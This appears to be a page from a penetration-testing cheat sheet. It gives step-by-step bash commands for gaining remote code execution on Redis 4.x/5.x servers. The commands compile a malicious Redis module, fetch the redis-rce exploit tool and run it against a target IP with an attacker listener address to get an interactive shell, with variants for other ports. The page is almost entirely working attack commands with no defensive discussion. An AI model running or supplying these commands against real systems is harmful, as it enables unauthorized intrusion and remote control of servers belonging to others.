# Load Redis module

{% code overflow="wrap" %}
```bash
# Ridter/redis-rce: Redis 4.x/5.x RCE (github.com)
# This attack will provide an interactive shell open to the attacker

# copy an attack module
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

# Compile 
cd RedisModules-ExecuteCommand/
make

# Copy an exploit
cd ../
git clone https://github.com/Ridter/redis-rce

cd redis-rce
python ./redis-rce.py -r 192.168.90.69 -L 192.168.49.90 -f ../RedisModules-ExecuteCommand/module.so

# If not work, you may change the port number 
python ./redis-rce.py -r 192.168.90.69 -L 192.168.49.90 -p 4444 -f ../RedisModules-ExecuteCommand/module.so

python ./redis-rce.py -r 192.168.90.69 -L 192.168.49.90 -p 50 -f ../RedisModules-ExecuteCommand/module.so
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (119).png" alt="" width="375"><figcaption></figcaption></figure>
